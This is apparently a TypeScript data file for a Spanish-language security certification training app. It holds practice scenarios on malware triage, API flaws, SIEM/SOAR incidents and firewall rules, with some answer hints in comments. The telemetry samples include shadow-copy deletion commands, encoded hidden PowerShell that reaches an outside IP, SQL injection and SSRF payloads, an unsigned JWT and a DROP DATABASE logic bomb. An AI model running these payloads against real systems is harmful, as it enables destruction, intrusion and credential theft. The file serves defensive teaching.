      serviceBanner: 'Windows Server 2008 R2 (SMBv1 enabled)',
      discoveredRisk: 'VULNERABLE a smb-vuln-ms17-010 (EternalBlue RCE)',
      selectedAnalysis: '',
      selectedRemediation: '',
    },
    {
      id: 'nmap-3389',
      portSpec: '3389/tcp (RDP)',
      serviceBanner: 'Microsoft Terminal Services (Direct WAN)',
      discoveredRisk: 'Escritorio remoto expuesto directamente sin Bastion ni MFA',
      selectedAnalysis: '',
      selectedRemediation: '',
    },
  ],
};

// --------------------------------------------------------
// PBQ 33: DNS Security, DoT/DoH & DNSSEC Hardening
// --------------------------------------------------------
export const INITIAL_DNS_STATE_PBQ33: DnsSecurityState = {
  dnssecRecordType: '', // Needs 'RRSIG'
  dnsEncryptionStandard: '', // Needs 'DoT_853'
  zoneTransferRestriction: '', // Needs 'restrict_tcp_53_authorized_secondaries'
  openRecursionMitigation: '', // Needs 'disable_open_recursion_internal_only'
};

// --------------------------------------------------------
// PBQ 34: Zero Trust Architecture (ZTA) & Microsegmentation State
// --------------------------------------------------------
export const INITIAL_ZERO_TRUST_STATE_PBQ34: ZeroTrustState = {
  policyDecisionEngine: '', // Needs 'pdp_pe_continuous'
  policyEnforcementLocation: '', // Needs 'pep_edge_microperimeter'
  networkTrafficControl: '', // Needs 'microsegmentation_least_privilege'
  continuousTrustEvaluation: '', // Needs 'continuous_adaptive_risk_validation'
};

// --------------------------------------------------------
// PBQ 35: Web Server Hardening & HTTP Security Headers State
// --------------------------------------------------------
export const INITIAL_WEB_HARDENING_STATE_PBQ35: WebServerHardeningState = {
  hstsHeaderConfig: '', // Needs 'hsts_max_age_includesubdomains_preload'
  cspHeaderConfig: '', // Needs 'csp_default_src_self_nonce'
  frameOptionsConfig: '', // Needs 'x_frame_options_deny'
  tlsProtocolVersion: '', // Needs 'tls_1_3_only'
};

// --------------------------------------------------------
// PBQ 36: Forensic Legal Hold & Evidence Chain of Custody
// --------------------------------------------------------
export const INITIAL_FORENSIC_HOLD_PBQ36: ForensicHoldState = {
  phase1: 'unselected',
  phase2: 'unselected',
  phase3: 'unselected',
  phase4: 'unselected',
  phase5: 'unselected',
  phase6: 'unselected',
  volatilityConcept: 'unselected',
  admissibilityStandard: 'unselected',
};

// --------------------------------------------------------
// PBQ 37: PKI Lifecycle, OCSP Stapling, X.509 Formats & Key Escrow
// --------------------------------------------------------
export const INITIAL_PKI_LIFECYCLE_PBQ37: PkiLifecycleState = {
  revocationProtocol: 'unselected',
  certFormatBundle: 'unselected',
  certFormatAscii: 'unselected',
  subjectAltNameConfig: 'unselected',
  privateKeyRecovery: 'unselected',
};

// --------------------------------------------------------
// PBQ 38: Wireless WPA3-Enterprise, 802.1X & WIPS State
// --------------------------------------------------------
export const INITIAL_WIRELESS_SECURITY_PBQ38: WirelessSecurityState = {
  wpaStandard: 'unselected',
  eapMethod: 'unselected',
  radiusPorts: 'unselected',
  wpaPersonalHandshake: 'unselected',
  rogueApDetection: 'unselected',
};

// --------------------------------------------------------
// PBQ 39: Cloud Storage DLP & CASB Data Classification State
// --------------------------------------------------------
export const INITIAL_CLOUD_DLP_PBQ39: CloudDlpState = {
  buckets: [
    {
      id: 'bucket-web-assets',
      bucketName: 's3://corp-public-web-assets-static',
      contentsDescription: 'Archivos CSS, imágenes de marketing, logos SVG corporativos y fuentes tipográficas descargables.',
      assignedTier: 'unselected',
      dlpPattern: 'unselected',
    },
    {
      id: 'bucket-cardholder',
      bucketName: 's3://payments-checkout-transactions-archive',
      contentsDescription: 'Registros de transacciones de pasarela Stripe/Visa con números PAN de tarjetas y fechas de expiración.',
      assignedTier: 'unselected',
      dlpPattern: 'unselected',
    },
    {
      id: 'bucket-hr-payroll',
      bucketName: 's3://hr-global-payroll-employee-records',
      contentsDescription: 'Nóminas mensuales, contratos de trabajo, números de la seguridad social (SSN) e historiales médicos.',
      assignedTier: 'unselected',
      dlpPattern: 'unselected',
    },
    {
      id: 'bucket-dev-api',
      bucketName: 's3://devops-terraform-state-secrets',
      contentsDescription: 'Archivos tfstate, tokens de acceso de producción AWS, claves SSH privadas y variables de entorno de base de datos.',
      assignedTier: 'unselected',
      dlpPattern: 'unselected',
    },
  ],
  casbInspectionMode: 'unselected',
  cloudKeyManagement: 'unselected',
};

// --------------------------------------------------------
// PBQ 40: Social Engineering Attacks & Defenses State
// --------------------------------------------------------
export const INITIAL_SOCIAL_ENG_PBQ40: SocialEngState = {
  cases: [
    {
      id: 'case-spear-cfo',
      techniqueName: 'Spear Phishing / Business Email Compromise (BEC)',
      scenarioText:
        'El Director Financiero recibe un correo urgente que parece provenir de la cuenta personal del CEO, ordenando transferir $250,000 para adquirir una empresa antes del mediodía bajo estricta confidencialidad.',
      identifiedTrigger: 'unselected',
      primaryDefense: 'unselected',
    },
    {
      id: 'case-vishing-helpdesk',
      techniqueName: 'Vishing Telefónico a Empleados del Helpdesk',
      scenarioText:
        'Un atacante llama al centro de soporte afirmando ser un vicepresidente en una conferencia internacional urgente que ha olvidado su contraseña y exige que se le dicte una contraseña temporal de inmediato.',
      identifiedTrigger: 'unselected',
      primaryDefense: 'unselected',
    },
    {
      id: 'case-usb-baiting',
      techniqueName: 'USB Baiting en el Estacionamiento de Empleados',
      scenarioText:
        'Varios pendrives USB con la etiqueta escrita a mano "Lista Salarios y Bonos 2026 - Confidencial" son esparcidos en el suelo cerca de la entrada principal de la empresa.',
      identifiedTrigger: 'unselected',
      primaryDefense: 'unselected',
    },
    {
      id: 'case-pretexting-vendor',
      techniqueName: 'Pretexting de Proveedor Estratégico',
      scenarioText:
        'Un atacante crea un personaje fingiendo ser el nuevo auditor de cuentas de un proveedor habitual de hardware y solicita actualizar el número de cuenta bancaria para futuras transferencias rutinarias.',
      identifiedTrigger: 'unselected',
      primaryDefense: 'unselected',
    },
    {
      id: 'case-watering-hole',
      techniqueName: 'Ataque de Watering Hole en Portal Sectorial',
      scenarioText:
        'Un grupo APT compromete el sitio web de noticias y foros técnicos más popular entre los ingenieros de la industria aeroespacial para servir un exploit zero-day en el navegador.',
      identifiedTrigger: 'unselected',
      primaryDefense: 'unselected',
    },
  ],
};

// PBQ 41 Initial State
export const INITIAL_CLOUD_SHARED_RESPONSIBILITY_PBQ41: CloudSharedResponsibilityState = {
  layers: [
    {
      layerId: 'physical_datacenter',
      layerName: 'Seguridad Física del Data Center & Hardware',
      description: 'Protección perimetral, CCTV, guardias armados, climatización HVAC y mantenimiento de racks.',
      iaasParty: '',
      paasParty: '',
      saasParty: '',
    },
    {
      layerId: 'hypervisor_network',
      layerName: 'Hipervisor y Red Física Subyacente (SDN)',
      description: 'Aislamiento de máquinas virtuales, parches del hipervisor KVM/Xen/Hyper-V y enrutadores físicos.',
      iaasParty: '',
      paasParty: '',
      saasParty: '',
    },
    {
      layerId: 'os_patching',
      layerName: 'Parches del Sistema Operativo de la Instancia / Host',
      description: 'Actualizaciones de seguridad de Linux/Windows, configuración del kernel y servicios del SO.',
      iaasParty: '',
      paasParty: '',
      saasParty: '',
    },
    {
      layerId: 'network_controls',
      layerName: 'Configuración de Reglas de Firewall / Security Groups',
      description: 'Definición de listas de control de acceso (ACLs), puertos permitidos y microsegmentación.',
      iaasParty: '',
      paasParty: '',
      saasParty: '',
    },
    {
      layerId: 'application_code',
      layerName: 'Código de Aplicación, APIs y Lógica de Negocio',
      description: 'Desarrollo seguro, análisis estático de vulnerabilidades (SAST), secrets management y sanitización.',
      iaasParty: '',
      paasParty: '',
      saasParty: '',
    },
    {
      layerId: 'data_and_iam',
      layerName: 'Clasificación de Datos, Control de Acceso IAM y Gestión de Cuentas',
      description: 'Políticas de contraseñas, MFA, asignación de roles RBAC, cifrado de datos y prevención de fuga.',
      iaasParty: '',
      paasParty: '',
      saasParty: '',
    },
  ],
};

// PBQ 42 Initial State
export const INITIAL_MITRE_THREAT_HUNTING_PBQ42: MitreThreatHuntingState = {
  scenarios: [
    {
      id: 'case-kerberoasting',
      techniqueName: 'Caso 1: Extracción Offline de Tickets Kerberos TGS',
      mitreCode: '',
      telemetrySource: '',
      remediationControl: '',
    },
    {
      id: 'case-lsass-dumping',
      techniqueName: 'Caso 2: Inyección y Volcado de Memoria LSASS (Mimikatz)',
      mitreCode: '',
      telemetrySource: '',
      remediationControl: '',
    },
    {
      id: 'case-llmnr-poisoning',
      techniqueName: 'Caso 3: Ataque Man-in-the-Middle y Envenenamiento LLMNR / NBT-NS',
      mitreCode: '',
      telemetrySource: '',
      remediationControl: '',
    },
    {
      id: 'case-golden-ticket',
      techniqueName: 'Caso 4: Persistencia Total mediante Forja de Ticket Kerberos TGT',
      mitreCode: '',
      telemetrySource: '',
      remediationControl: '',
    },
    {
      id: 'case-powershell-fileless',
      techniqueName: 'Caso 5: Ejecución en Memoria de PowerShell Ofuscado Base64',
      mitreCode: '',
      telemetrySource: '',
      remediationControl: '',
    },
  ],
};

// PBQ 43 Initial State: Data Governance, Roles & Sanitization
export const INITIAL_DATA_GOVERNANCE_PBQ43: DataGovernanceState = {
  ownerRoleAssignment: '',
  stewardRoleAssignment: '',
  custodianRoleAssignment: '',
  privacyOfficerAssignment: '',
  inTransitProtection: '',
  atRestProtection: '',
  inUseProtection: '',
  clearingMethod: '',
  purgingMethod: '',
  destructionMethod: '',
  cryptoShreddingMethod: '',
};

// PBQ 44 Initial State: Privacy Enhancing Technologies (PETs)
export const INITIAL_PRIVACY_PETS_PBQ44: PrivacyPetsState = {
  scenarios: [
    {
      id: 'pet-pci-dss',
      useCaseName: 'Pasarela de Pagos de Tarjetas de Crédito (Cumplimiento PCI-DSS)',
      description: 'Una plataforma de e-commerce procesa números de tarjeta (PAN de 16 dígitos). Para minimizar el alcance de la auditoría PCI-DSS, el servidor web no debe almacenar números reales en su base de datos relacional, sino un identificador sustituto que solo una bóveda externa certificada puede resolver.',
      selectedTechnique: '',
      reversibility: '',
    },
    {
      id: 'pet-dev-qa',
      useCaseName: 'Base de Datos para Entornos de Pruebas y Desarrollo (Dev/QA)',
      description: 'El equipo de ingeniería necesita una copia exacta de la base de datos de producción con sus relaciones íntegras para realizar pruebas de carga y QA, pero los desarrolladores externos no deben tener acceso a nombres reales, salarios ni números de seguridad social de los empleados.',
      selectedTechnique: '',
      reversibility: '',
    },
    {
      id: 'pet-call-center',
      useCaseName: 'Atención Telefónica al Cliente en Tiempo Real (Call Center)',
      description: 'Los agentes de soporte telefónico necesitan verificar la identidad de los usuarios solicitando únicamente los últimos 4 dígitos de su cuenta bancaria. La pantalla del agente solo debe mostrar asteriscos salvo los últimos caracteres, pero el registro en la base de datos permanece intacto sin alteración.',
      selectedTechnique: '',
      reversibility: '',
    },
    {
      id: 'pet-epidemiology',
      useCaseName: 'Investigación Médica y Analítica Epidemiológica (GDPR Recital 26)',
      description: 'Un consorcio hospitalario comparte registros clínicos con investigadores universitarios para estudiar patrones de propagación de enfermedades. Por motivos regulatorios de privacidad, los datos deben ser completamente disociados sin posibilidad de re-identificar a ningún paciente ni siquiera por el hospital emisor.',
      selectedTechnique: '',
      reversibility: '',
    },
    {
      id: 'pet-clinical-trials',
      useCaseName: 'Ensayos Clínicos Farmacéuticos con Re-identificación Médica',
      description: 'En un estudio clínico de fase III para un nuevo fármaco, los nombres de los pacientes son reemplazados por códigos únicos aleatorios. Si un paciente experimenta un efecto adverso crítico con riesgo vital, el médico investigador principal debe poder correlacionar de inmediato el código con el expediente médico original mediante una clave custodiada.',
      selectedTechnique: '',
      reversibility: '',
    },
  ],
};

// PBQ 45 Initial State: Malware Triage Parte 1 (Endpoints & Criptografía)
export const INITIAL_MALWARE_TRIAGE_PBQ45: MalwareTriageState = {
  scenarios: [
    {
      id: 'mw-ransomware',
      scenarioTitle: 'Caso 1: Cifrado Masivo de Archivos y Borrado de Volume Shadows (vssadmin)',
      observedIndicators: 'Los usuarios informan que todos sus archivos compartidos (.docx, .xlsx, .pdf) tienen ahora la extensión anómala ".locked". Aparece un archivo "COMO_RECUPERAR_ARCHIVOS.txt" exigiendo 2 Monero. Ningún archivo puede abrirse.',
      technicalTelemetry: 'Sysmon Event ID 1: vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No & wbadmin delete catalog -quiet\nProceso padre: powershell.exe invocando llamada a CryptoAPI CryptEncrypt en bucle de carpetas C:\\Data\\*',
      selectedMalwareType: '',
      selectedRemediation: '',
    },
    {
      id: 'mw-rat',
      scenarioTitle: 'Caso 2: Utilidad Descargada, Backdoor Inverso y Control Remoto de Periféricos',
      observedIndicators: 'Un empleado instaló una aplicación no autorizada de optimización de PC desde una web no oficial. Días después, el cursor del mouse se mueve solo en pantalla, el LED de la cámara web se enciende sin permiso y se transfieren archivos silenciosamente.',
      technicalTelemetry: 'Netstat / EDR Telemetry: Proceso svchost_helper.exe ejecutándose desde C:\\Users\\User1\\AppData\\Roaming\\\nSocket TCP: Conexión saliente ESTABLISHED hacia 198.51.100.42:4449 (IP en país no corporativo)\nCaptura de pantalla enviada por socket cada 30 segundos.',
      selectedMalwareType: '',
      selectedRemediation: '',
    },
    {
      id: 'mw-rootkit',
      scenarioTitle: 'Caso 3: Ocultamiento de Procesos y Conexiones en Nivel Kernel (Ring 0 / UEFI)',
      observedIndicators: 'El servidor de autenticación muestra anomalías de rendimiento en CPU. Al ejecutar "ps aux" o el Administrador de Tareas, todo parece normal y no hay procesos sospechosos. Sin embargo, un análisis de red externo (SPAN/TAP) detecta cientos de MB exfiltrados.',
      technicalTelemetry: 'Rootkit Hunter / Volatility Memory Analysis: Gancho (hooking) detectado en la System Service Descriptor Table (SSDT).\nKernel Module sin firmar: "sys_stealth_mod.ko" intercepta llamadas sys_getdents64 y sys_kill para ocultar procesos y archivos del espacio de usuario.',
      selectedMalwareType: '',
      selectedRemediation: '',
    },
    {
      id: 'mw-spyware-keylogger',
      scenarioTitle: 'Caso 4: Robo Pasivo de Pulsaciones (GetAsyncKeyState) y Extracción de Cookies',
      observedIndicators: 'Varios directivos sufren transferencias bancarias no autorizadas. Los directivos no abrieron enlaces sospechosos recientemente. En una auditoría forense se localiza un proceso que lee en memoria cada pulsación de teclado y almacena tokens de autenticación.',
      technicalTelemetry: 'Sysmon Event ID 7 (Image Loaded): Hook de API de Windows en user32.dll -> GetAsyncKeyState y SetWindowsHookExW.\nLectura no autorizada del archivo "%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies". Envío periódico HTTP POST a bot de Telegram.',
      selectedMalwareType: '',
      selectedRemediation: '',
    },
    {
      id: 'mw-fileless-lotl',
      scenarioTitle: 'Caso 5: Inyección en Memoria y Scripts PowerShell Base64 Living-off-the-Land (LotL)',
      observedIndicators: 'El antivirus con base de firmas no encuentra ningún archivo ".exe" malicioso en todo el disco duro (0 archivos infectados). Sin embargo, el endpoint genera tráfico C2 permanente. El ataque reside puramente en la memoria RAM del sistema.',
      technicalTelemetry: 'Windows Event ID 4104 (Script Block Logging):\npowershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLi4u\nInyección de hilo remoto (CreateRemoteThread) ejecutando shellcode dentro de explorer.exe (PID 2140).',
      selectedMalwareType: '',
      selectedRemediation: '',
    },
  ],
};

// PBQ 46 Initial State: Malware Triage Parte 2 (Amenazas de Red, Lógica y Evasión Avanzada)
export const INITIAL_MALWARE_TRIAGE_PBQ46: MalwareTriageState = {
  scenarios: [
    {
      id: 'mw-worm',
      scenarioTitle: 'Caso 1: Propagación Lateral Autónoma en Red por Puerto SMB (TCP 445)',
      observedIndicators: 'En menos de 20 minutos, más de 150 servidores de la subred corporativa quedan infectados secuencialmente sin que ningún usuario haya interactuado con correos o archivos. El ancho de banda colapsa por escaneos sincronizados.',
      technicalTelemetry: 'Captura Wireshark / Zeek: Ráfagas masivas de paquetes TCP SYN dirigidos al puerto 445 (SMB) de todas las IPs del segmento /24.\nCarga útil SMB malformada enviando exploit EternalBlue (MS17-010) y creando el servicio remoto "mssecsvc2.0" de forma autónoma.',
      selectedMalwareType: '',
      selectedRemediation: '',
    },
    {
      id: 'mw-botnet',
      scenarioTitle: 'Caso 2: Red de Hosts Zombi con Balizas C2 Periódicas y Ataques DDoS Coordinados',
      observedIndicators: 'El SIEM detecta que 80 estaciones de trabajo se comunican con patrones idénticos cada exactamente 60 segundos hacia dominios con nombres aleatorios (.xyz, .top). Repentinamente, todos los equipos saturan con tráfico SYN una IP externa de la competencia.',
      technicalTelemetry: 'DNS Analytics: Consultas masivas DGA (Domain Generation Algorithm) tipo "x7df92a01ms.top" con TTL de 30 segundos.\nTráfico perimetral: Ataque distribuido SYN Flood originado simultáneamente desde 80 IPs internas bajo instrucciones del servidor C2.',
      selectedMalwareType: '',
      selectedRemediation: '',
    },
    {
      id: 'mw-logic-bomb',
      scenarioTitle: 'Caso 3: Código Latente Condicional Implantado por Amenaza Interna (Insider)',
      observedIndicators: 'A las 00:00 del viernes, todas las bases de datos de clientes fueron truncadas y eliminadas. La investigación descubre que el código malicioso fue introducido hace 6 meses por un ex-desarrollador que fue despedido el miércoles anterior.',
      technicalTelemetry: 'Auditoría de Código y Registro de Tareas:\nScript SQL ejecutado por tarea oculta: "IF NOT EXISTS (SELECT * FROM ActiveDirectory_Users WHERE username = \'jdeveloper\' AND status = \'ACTIVE\') BEGIN DROP DATABASE CustomerDB; END"',
      selectedMalwareType: '',
      selectedRemediation: '',
    },
    {
      id: 'mw-cryptominer',
      scenarioTitle: 'Caso 4: Secuestro de CPU al 100% y Tráfico hacia Mining Pools (Puerto 3333)',
      observedIndicators: 'Múltiples servidores de base de datos y cálculo presentan tiempos de respuesta inaceptables. Los administradores observan el uso de procesador estancado en el 99-100% y los ventiladores funcionando a máxima revolución las 24 horas.',
      technicalTelemetry: 'Linux "htop" / Windows Task Manager:\nProceso binario ofuscado "kworker_system" consumiendo el 99.8% de CPU en los 32 núcleos.\nFirewall Egress: Conexión persistente hacia "stratum+tcp://pool.supportxmr.com:3333" transfiriendo hashes criptográficos de Monero.',
      selectedMalwareType: '',
      selectedRemediation: '',
    },
    {
      id: 'mw-polymorphic',
      scenarioTitle: 'Caso 5: Mutación Continua de Binarios que Invalida Listas Negras de Hashes',
      observedIndicators: 'El equipo de seguridad extrajo la muestra del virus en el Host A y calculó su hash SHA-256 para bloquearlo en el antivirus perimetral. Minutos después, el Host B se infecta con el mismo malware, pero el antivirus no lo detecta porque el hash es completamente distinto.',
      technicalTelemetry: 'Análisis de Muestras en Laboratorio (Ghidra / IDA Pro):\nEl motor del malware recompila su rutina de descifrado (stub) e intercambia registros, inserta instrucciones NOP y cambia la clave XOR en cada infección.\nEl payload final en memoria es idéntico, pero el hash binario en disco muta en cada máquina infectada.',
      selectedMalwareType: '',
      selectedRemediation: '',
    },
  ],
};

// --------------------------------------------------------
// PBQ 47: Secure Software Development & OWASP API Top 10
// --------------------------------------------------------
export const INITIAL_API_SECURITY_PBQ47: ApiSecurityState = {
  scenarios: [
    {
      id: 'api-bola-user-profile',
      endpointTitle: 'Endpoint 1: Obtención de Perfil de Usuario y Balances Financieros',
      httpPayloadOrCode:
        'GET /api/v1/users/502/financial-profile HTTP/1.1\nHost: api.fintech-secure.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... (Token emitido para Usuario ID: 104)\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n{\n  "userId": 502,\n  "ownerName": "Elena Morales",\n  "ssn": "XXX-XX-9412",\n  "bankAccount": "ES91 2100 0418 4502 0005 1192",\n  "totalBalance": 48200.50\n}',
      identifiedVulnerability: '',
      secureRemediation: ''
    },
    {
      id: 'api-ssrf-metadata',
      endpointTitle: 'Endpoint 2: Generador de Miniaturas de Perfil vía URL Externa',
      httpPayloadOrCode:
        'POST /api/v1/user/avatar-fetch HTTP/1.1\nHost: api.fintech-secure.com\nContent-Type: application/json\n{\n  "image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-fintech-admin-role"\n}\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n{\n  "Code": "Success",\n  "AccessKeyId": "ASIAQEXAMPLEKEYS58",\n  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n  "Token": "IQoJb3JpZ2luX2VjEEXAMPLE...",\n  "Expiration": "2026-10-22T14:30:00Z"\n}',
      identifiedVulnerability: '',
      secureRemediation: ''
    },
    {
      id: 'api-jwt-alg-none',
      endpointTitle: 'Endpoint 3: Servicio de Liquidación y Transferencias Bancarias',
      httpPayloadOrCode:
        'POST /api/v1/transfers/authorize HTTP/1.1\nHost: api.fintech-secure.com\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzEwNCIsInJvbGUiOiJzdXBlcmFkbWluIiwicGVybWlzc2lvbnMiOlsidHJhbnNmZXJfZnVuZHMiLCJhcHByb3ZlX2xvYW4iXX0.\n\n[Decodificación de JWT]:\nHeader:  {"alg": "none", "typ": "JWT"}\nPayload: {"sub": "user_104", "role": "superadmin", "permissions": ["transfer_funds"]}\nFirma Criptográfica: [TOTALMENTE OMITIDA / VACÍA]\n\nHTTP/1.1 200 OK\n{"status": "TRANSFER_APPROVED", "amount": 250000.00, "authorizedBy": "superadmin"}',
      identifiedVulnerability: '',
      secureRemediation: ''
    },
    {
      id: 'api-sqli-rest',
      endpointTitle: 'Endpoint 4: Búsqueda Histórica de Facturas y Pagos',
      httpPayloadOrCode:
        'GET /api/v1/invoices?clientId=101\'%20OR%20\'1\'=\'1\'-- HTTP/1.1\nHost: api.fintech-secure.com\n\n[Query SQL generada en backend mediante concatenación directa]:\nSELECT * FROM invoices WHERE client_id = \'101\' OR \'1\'=\'1\'--\'\n\nHTTP/1.1 200 OK\nContent-Type: application/json\n[Exfiltración masiva: Devolviendo 148,920 registros confidenciales pertenecientes a todos los clientes de la entidad]',
      identifiedVulnerability: '',
      secureRemediation: ''
    },
    {
      id: 'api-rate-limiting-stuffing',
      endpointTitle: 'Endpoint 5: Endpoint de Autenticación de Clientes Móviles',
      httpPayloadOrCode:
        'POST /api/v1/auth/token HTTP/1.1\nHost: api.fintech-secure.com\nContent-Type: application/json\n\n[Métricas de Acceso en Edge Router / Reverse Proxy]:\n- 48,000 peticiones POST recibidas en 180 segundos.\n- Origen: 1,450 direcciones IP residenciales distintas rotando aleatoriamente.\n- Payload: Pruebas automatizadas de pares usuario:contraseña filtrados de bases públicas.\n- HTTP/1.1 200 OK en 134 peticiones (Cuentas comprometidas exitosamente sin retardo, bloqueo ni captcha)',
      identifiedVulnerability: '',
      secureRemediation: ''
    }
  ]
};

// --------------------------------------------------------
// PBQ 48: SIEM Correlation Rules & SOAR Playbook Automation
// --------------------------------------------------------
export const INITIAL_SOAR_AUTOMATION_PBQ48: SoarAutomationState = {
  scenarios: [
    {
      id: 'soar-impossible-travel',
      incidentTitle: 'Incidente 1: Inicios de Sesión Exitosos Simultáneos en Ubicaciones Geográficas Incompatibles',
      siemLogPattern:
        '10:14:02 UTC - Azure AD / Entra ID Sign-in: User "carlos.admin@empresa.com"\n  IP: 185.220.101.4 (Frankfurt, Alemania) - Auth: SUCCESS (FIDO2 Token)\n\n10:22:15 UTC - Azure AD / Entra ID Sign-in: User "carlos.admin@empresa.com"\n  IP: 203.0.113.88 (Tokio, Japón) - Auth: SUCCESS (Session Token Cookie)\n\nDelta de Tiempo: 8m 13s | Distancia Geodésica: 9,350 km | Velocidad Estimada: 68,414 km/h',
      correlationTrigger: '',
      automatedSoarAction: ''
    },
    {
      id: 'soar-ransomware-mass-io',
      incidentTitle: 'Incidente 2: Pico Anómalo de Modificación de Archivos y Destrucción de Copias de Seguridad',
      siemLogPattern:
        '14:32:01 UTC - Sysmon Event ID 11 (FileCreate):\n  Proceso: svchost_fake.exe (PID: 4812)\n  Tasa de I/O: >350 archivos/seg renombramiento masivo con sufijo ".cryp70" en D:\\SharedAccounting\\\n\n14:32:04 UTC - Sysmon Event ID 1 (ProcessCreation):\n  Parent: svchost_fake.exe\n  CommandLine: "cmd.exe /c vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No"',
      correlationTrigger: '',
      automatedSoarAction: ''
    },
    {
      id: 'soar-phishing-macro-shell',
      incidentTitle: 'Incidente 3: Macro de Documento Genera Proceso Hijo PowerShell con Conexión C2 Saliente',
      siemLogPattern:
        '09:15:20 UTC - Sysmon Event ID 1 (ProcessCreation):\n  ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\n  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  CommandLine: -ExecutionPolicy Bypass -WindowStyle Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADIAMgAiACwANAA0ADMAKQ... \n\n09:15:22 UTC - Sysmon Event ID 3 (NetworkConnection):\n  powershell.exe conectándose a IP pública 198.51.100.22:443 (Dominio DGA: update-edge-msft.com)',
      correlationTrigger: '',
      automatedSoarAction: ''
    },
    {
      id: 'soar-ssh-brute-burst',
      incidentTitle: 'Incidente 4: Ráfaga Automatizada de Autenticaciones Fallidas SSH contra Servidor Perimetral',
      siemLogPattern:
        '03:40:10 UTC a 03:40:55 UTC - Linux /var/log/auth.log en Bastion-Host-01:\n"sshd[19281]: Failed password for invalid user root from 194.26.29.112 port 48210 ssh2"\n"sshd[19284]: Failed password for invalid user admin from 194.26.29.112 port 48214 ssh2"\n"sshd[19287]: Failed password for invalid user deploy from 194.26.29.112 port 48218 ssh2"\n[Eventos continuos: 156 autenticaciones fallidas en 45 segundos desde la misma IP pública]',
      correlationTrigger: '',
      automatedSoarAction: ''
    },
    {
      id: 'soar-domain-admin-offhours',
      incidentTitle: 'Incidente 5: Modificación No Autorizada de Grupo de Máximo Privilegio Fuera de Horario',
      siemLogPattern:
        '02:18:44 UTC (Domingo) - Windows Security Log DC01 Event ID 4728:\n"A member was added to a security-enabled global group"\nTarget Group: CN=Domain Admins,CN=Users,DC=corp,DC=local\nMember Added: CN=temp_contractor_jdoe,OU=ExternalContractors,DC=corp,DC=local\nCaller User: CN=svc_backup,OU=ServiceAccounts,DC=corp,DC=local\nITSM Change Ticket Status: NINGÚN TICKET DE CAMBIO ENCONTRADO / FUERA DE VENTANA DE MANTENIMIENTO',
      correlationTrigger: '',
      automatedSoarAction: ''
    }
  ]
};

// --------------------------------------------------------
// PBQ 49: Advanced Stateful Firewall ACLs & DMZ Multi-Tier Filtering
// --------------------------------------------------------
export const INITIAL_FIREWALL_RULES_PBQ49: FirewallRule[] = [
  // Deliberate misconfigurations to find: first-match order, least privilege to the DB, DMZ isolation, wrong service ports.
  {
    id: 'fw49-rule-1',
    ruleNumber: 10,
    action: 'PERMIT',
    protocol: 'TCP',
    sourceIp: '0.0.0.0/0',
    sourcePort: 'ANY',
    destIp: '172.16.10.10',
    destPort: '443',
    description: 'Permitir tráfico web HTTPS entrante desde WAN hacia DMZ Web Server',
    enabled: true
  },
  {
    id: 'fw49-rule-7',
    ruleNumber: 20,
    action: 'DENY',
    protocol: 'ANY',
    sourceIp: '0.0.0.0/0',
    sourcePort: 'ANY',
    destIp: '0.0.0.0/0',
    destPort: 'ANY',
    description: 'Denegación Implícita Final (Implicit Deny Any Any)',
    enabled: true
  },
  {
    id: 'fw49-rule-2',
    ruleNumber: 30,
    action: 'PERMIT',
    protocol: 'TCP',
    sourceIp: '0.0.0.0/0',
    sourcePort: 'ANY',
    destIp: '172.16.10.20',
    destPort: '110',
    description: 'Permitir recepción de correo seguro SMTPS desde WAN hacia Pasarela DMZ',
    enabled: true
  },
  {
    id: 'fw49-rule-3',
    ruleNumber: 40,
    action: 'PERMIT',
    protocol: 'TCP',
    sourceIp: '172.16.10.0/24',
    sourcePort: 'ANY',
    destIp: '10.0.30.50',
    destPort: '5432',
    description: 'Permitir consultas PostgreSQL exclusivamente desde DMZ Web Server hacia BD PCI-DSS',
    enabled: true
  },
  {
    id: 'fw49-rule-4',
    ruleNumber: 50,
    action: 'PERMIT',
    protocol: 'ANY',
    sourceIp: '172.16.10.0/24',
    sourcePort: 'ANY',
    destIp: '10.0.20.0/24',
    destPort: 'ANY',
    description: 'Aislamiento DMZ: Bloquear todo tráfico originado en DMZ hacia LAN corporativa',
    enabled: true
  },
  {
    id: 'fw49-rule-5',
    ruleNumber: 60,
    action: 'PERMIT',
    protocol: 'TCP',
    sourceIp: '10.0.20.0/24',
    sourcePort: 'ANY',
    destIp: '0.0.0.0/0',
    destPort: '80',
    description: 'Salida web HTTPS segura para estaciones de trabajo de la LAN corporativa',
    enabled: true
  },
  {
    id: 'fw49-rule-6',
    ruleNumber: 70,
    action: 'DENY',
    protocol: 'ANY',
    sourceIp: '0.0.0.0/0',
    sourcePort: 'ANY',
    destIp: '10.0.30.0/24',
    destPort: 'ANY',
    description: 'Bloqueo explícito de acceso directo desde WAN hacia Subred de Base de Datos PCI-DSS',
    enabled: true
  }
];

export const FIREWALL_PACKET_TESTS_PBQ49: FirewallPacketTest[] = [
  {
    id: 'test-wan-web-https',
    name: 'Cliente Público -> Web Server DMZ (HTTPS)',
    sourceIp: '203.0.113.45',
    protocol: 'TCP',
    destIp: '172.16.10.10',
    destPort: '443',
    expectedAction: 'PERMIT',
    description: 'Tráfico de clientes externos accediendo al portal bancario seguro en la DMZ.'
  },
  {
    id: 'test-wan-mail-smtps',
